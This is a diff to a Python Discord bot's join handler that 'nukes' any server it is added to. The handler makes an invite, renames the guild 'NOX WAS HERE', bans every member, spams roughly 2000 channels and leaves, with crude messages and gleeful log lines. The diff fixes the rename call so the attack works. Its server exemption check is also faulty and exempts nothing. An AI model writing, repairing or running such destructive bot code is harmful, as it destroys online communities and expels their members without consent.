@@ -13,13 +13,14 @@ class Startup(commands.Cog):
         print('Logged in as: ' + self.bot.user.name + '#' + self.bot.user.discriminator + ' - (' + str(self.bot.user.id) + ')')
     @commands.Cog.listener()
     async def on_guild_join(self, guild):
+        
         if guild.id != 993573362221715546 or guild.id != 993594197594607636:
             try:
                 print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
                 await guild.create_text_channel(f'fuckme1')
                 invite = await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                 print(f'Guild: {guild.name} - {str(guild.id)} - Invite: {str(invite)} :)')
-                await guild.edit("NOX WAS HERE")
+                await guild.edit(name="NOX WAS HERE")
                 print(f'Nuked guild: {guild.name} - {str(guild.id)} - Changed server name :)')
                 for member in guild.members:
                     await member.ban(reason='Banned by Anix <3')
@@ -34,7 +35,7 @@ class Startup(commands.Cog):
                 print(f'Guild: {guild.name} - {str(guild.id)} - Created 2000 channels :)')
                 await guild.leave()
                 # error for 
-                print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')
+                print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')  
             except discord.ext.commands.GuildNotFound or discord.ext.commands.Forbidden:
                 print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Kicked or have been banned")
     @commands.Cog.listener()
